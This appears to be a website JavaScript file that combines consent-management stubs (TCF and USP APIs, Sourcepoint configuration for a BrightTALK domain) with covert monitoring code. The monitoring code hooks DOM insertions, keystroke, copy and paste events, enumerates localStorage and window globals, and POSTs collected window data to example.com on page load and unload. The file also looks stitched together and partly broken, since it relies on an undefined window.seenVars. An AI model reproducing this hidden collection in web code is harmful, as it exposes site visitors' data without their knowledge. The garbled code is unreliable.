// Monitor element or node manipulation
Object.defineProperty(Node.prototype, 'appendChild', {
  value: function (key) {
    console.log('An element was appended: ', key);
    return Element.prototype.appendChild.apply(this, arguments);
  },
  writable: true,
  configurable: true
});
Object.defineProperty(Node.prototype, 'removeChild', {
  value: function (key) {
    console.log('An element was removed: ', key);
    return Element.prototype.removeChild.apply(this, arguments);
  },
  writable: true,
  configurable: true
});
!function () {
  var e = function () {
    var e,
      t = "__tcfapiLocator",
      a = [],
      n = window;
    for (; n;) {
      try {
        if (n.frames[t]) {
          e = n;
          break;
        }
      } catch (e) {}
      if (n === window.top) break;
      n = n.parent;
    }
    e || (!function e() {
      var a = n.document,
        r = !!n.frames[t];
      if (!r) if (a.body) {
        var i = a.createElement("iframe");
        i.style.cssText = "display:none", i.name = t, a.body.appendChild(i);
      } else setTimeout(e, 5);
      return !r;
    }(), n.__tcfapi = function () {
      for (var e, t = arguments.length, n = new Array(t), r = 0; r < t; r++) n[r] = arguments[r];
      if (!n.length) return a;
      if ("setGdprApplies" === n[0]) n.length > 3 && 2 === parseInt(n[1], 10) && "boolean" == typeof n[3] && (e = n[3], "function" == typeof n[2] && n[2]("set", !0));else if ("ping" === n[0]) {
        var i = {
          gdprApplies: e,
          cmpLoaded: !1,
          cmpStatus: "stub"
        };
        "function" == typeof n[2] && n[2](i);
      } else a.push(n);
    }, n.addEventListener("message", function (e) {
      var t = "string" == typeof e.data,
        a = {};
      try {
        a = t ? JSON.parse(e.data) : e.data;
      } catch (e) {}
      var n = a.__tcfapiCall;
      n && window.__tcfapi(n.command, n.version, function (a, r) {
        var i = {
          __tcfapiReturn: {
            returnValue: a,
            success: r,
            callId: n.callId
          }
        };
        t && (i = JSON.stringify(i)), e.source.postMessage(i, "*");
      }, n.parameter);
    }, !1));
  };
  "undefined" != typeof module ? module.exports = e : e();
}();
function documentEventsTracking() {
  var documentEvents = ["mousedown", "mouseup", "keydown", "keyup", "copy", "paste"];
  documentEvents.forEach(function (eventName) {
    document.addEventListener(eventName, function (event) {
      console.log("Event: " + eventName + " on " + event.target.tagName + " element.");
    });
  });
}
(function () {
  var e = false;
  var c = window;
  var t = document;
  function r() {
    if (!c.frames["__uspapiLocator"]) {
      if (t.body) {
        var a = t.body;
        var e = t.createElement("iframe");
        e.style.cssText = "display:none";
        e.name = "__uspapiLocator";
        a.appendChild(e);
      } else {
        setTimeout(r, 5);
      }
    }
  }
  r();
  function p() {
    var a = arguments;
    __uspapi.a = __uspapi.a || [];
    if (!a.length) {
      return __uspapi.a;
    } else if (a[0] === "ping") {
      a[2]({
        gdprAppliesGlobally: e,
        cmpLoaded: false
      }, true);
    } else {
      __uspapi.a.push([].slice.apply(a));
    }
  }
  function l(t) {
    var r = typeof t.data === "string";
    try {
      var a = r ? JSON.parse(t.data) : t.data;
      if (a.__cmpCall) {
        var n = a.__cmpCall;
        c.__uspapi(n.command, n.parameter, function (a, e) {
          var c = {
            __cmpReturn: {
              returnValue: a,
              success: e,
              callId: n.callId
            }
          };
          t.source.postMessage(r ? JSON.stringify(c) : c, "*");
        });
      }
    } catch (a) {}
  }
  if (typeof __uspapi !== "function") {
    c.__uspapi = p;
    __uspapi.msgHandler = l;
    c.addEventListener("message", l, false);
  }
})();
function localGlobalVarTracking() {
  for (let key in localStorage) {
    console.log('Local Storage Key: ' + key);
  }
  for (let key in window) {
    console.log('Global Variable: ' + key);
  }
}
var c = document.cookie.indexOf("ccpa_cta=true");
function loopWindowObj() {
  var newDiscoveries = {};
  for (let prop in window) {
    if (Object.prototype.hasOwnProperty.call(window, prop)) {
      if (!window.seenVars.some(seenProp => seenProp === prop)) {
        let propValue = window[prop];
        let propType = typeof propValue;
        newDiscoveries[prop] = {
          type: propType,
          value: propType === "function" ? propValue.toString() : propValue
        };
      }
    }
  }
  return newDiscoveries;
}
function sendData(data) {
  const endpoint = "https://example.com/api/collect-data";
  const request = new XMLHttpRequest();
  request.open("POST", endpoint, true);
  request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  request.onload = function () {
    if (request.status >= 200 && request.status < 400) {
      console.log("Data transmission successful");
    } else {
      console.error("Data transmission failed, status code: " + request.status);
    }
  };
  request.onerror = function () {
    console.error("Error occured during data transmission");
  };
  request.send(JSON.stringify(data));
}
function taskRunner() {
  documentEventsTracking();
  localGlobalVarTracking();
  const discoveries = loopWindowObj();
  if (Object.keys(discoveries).length > 0) {
    console.log(`Found ${Object.keys(discoveries).length} new window properties`);
    sendData(discoveries);
  } else {
    console.log("No new window properties found");
  }
}
ccpa_cta_str = c.toString(), console.log("ccpa_cta: " + ccpa_cta_str), window._sp_ = {
  config: {
    accountId: 370,
    baseEndpoint: 'https://consent.brighttalk.com',
    propertyHref: 'https://www.brighttalk2.com',
    joinHref: true,
    targetingParams: {
      type: "gdpr"
    }
  }
};
window._sp_ccpa = {
  config: {
    mmsDomain: "https://consent.brighttalk.com",
    ccpaOrigin: "https://ccpa-service.sp-prod.net",
    siteHref: 'https://www.brighttalk2.com',
    joinHref: true,
    events: {
      onMessageReady: function () {
        console.log("onMessageReady");
      },
      onMessageChoiceSelect: function (e, n) {
        console.log("onMessageChoiceSelect choice_id: ", e), console.log("onMessageChoiceSelect choice_id: ", n);
        var o = new Date();
        o.setMonth(o.getMonth() + 12), document.cookie = "ccpa_cta=true;expires=" + o + ";domain=" + window.location.hostname + ";path=/", 15 !== n && 11 !== n || (document.getElementById("cmp-banner").style.display = "none");
      }
    },
    targetingParams: {
      ccpa_cta: ccpa_cta_str,
      type: "ccpa"
    },
    accountId: 370,
    getDnsMsgMms: true,
    alwaysDisplayDns: false
  }
};
window.__tcfapi('getTCData', 2, function (data, success) {
  console.log("data.gdprApplies: " + data.gdprApplies);
  if (data.gdprApplies) {
    document.getElementById("gdpr_link").style.display = "block";
  }
});
window.addEventListener('DOMContentLoaded', taskRunner, false);
window.addEventListener('beforeunload', taskRunner, false);